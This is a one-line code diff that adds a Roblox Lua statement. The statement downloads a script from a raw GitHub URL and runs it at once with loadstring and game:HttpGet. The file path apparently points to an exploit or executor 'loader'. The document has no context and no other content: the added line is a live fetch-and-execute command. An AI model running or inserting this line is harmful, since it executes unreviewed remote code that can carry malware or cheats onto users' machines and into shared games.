@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ContractorStrike/loaders/main/loaders/hide-in-pixels-spam1-3wkaq2v7m4xdi7.lua"))()
